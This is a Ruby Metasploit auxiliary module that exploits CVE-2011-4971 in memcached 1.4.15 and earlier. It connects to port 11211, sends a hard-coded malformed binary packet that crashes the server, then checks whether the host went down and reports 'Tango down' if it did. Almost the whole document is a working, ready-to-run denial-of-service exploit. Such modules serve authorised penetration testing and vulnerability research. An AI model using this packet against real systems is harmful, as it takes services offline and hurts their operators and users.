##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Memcached Remote Denial of Service',
        'Description' => %q{
          This module sends a specially-crafted packet to cause a
          segmentation fault in memcached v1.4.15 or earlier versions.
        },
        'References' => [
          [ 'URL', 'https://code.google.com/archive/p/memcached/issues/192' ],
          [ 'CVE', '2011-4971' ],
          [ 'OSVDB', '92867' ]
        ],
        'Author' => [ 'Gregory Man <man.gregory[at]gmail.com>' ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SERVICE_DOWN],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options([Opt::RPORT(11211),])
  end

  def is_alive?
    connect
    disconnect
    true
  rescue Rex::ConnectionRefused
    return false
  end

  def run
    connect
    pkt = "\x80\x12\x00\x01\x08\x00\x00\x00\xff\xff\xff\xe8\x00\x00\x00\x00"
    pkt << "\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00"
    pkt << "\x00\x00\x00\x00\x00\x000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    pkt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

    print_status("#{rhost}:#{rport} - Sending dos packet...")
    sock.put(pkt)
    disconnect

    print_status("#{rhost}:#{rport} - Checking host status...")
    select(nil, nil, nil, 1)

    if is_alive?
      print_error("#{rhost}:#{rport} - The DoS attempt did not work, host is still alive")
    else
      print_good("#{rhost}:#{rport} - Tango down") # WWJS - What would th3j35t3r say?
    end
  end
end
